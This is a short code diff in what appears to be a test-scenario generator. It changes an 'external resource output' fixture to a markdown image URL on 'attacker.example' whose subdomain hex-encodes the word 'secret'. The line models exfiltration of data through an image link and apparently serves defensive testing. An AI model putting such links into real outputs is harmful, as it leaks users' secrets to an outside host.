@@ -322,7 +322,7 @@ def _invalid_output(size: int) -> TextScenario:
 
 
 def _external_resource_output(size: int) -> TextScenario:
-    url = "https://outside.example/pixel.png?payload=synthetic"
+    url = "https://736563726574.attacker.example/a.png"
     prefix = '{"image":"![status]('
     suffix = ')","padding":"'
     ending = '"}'
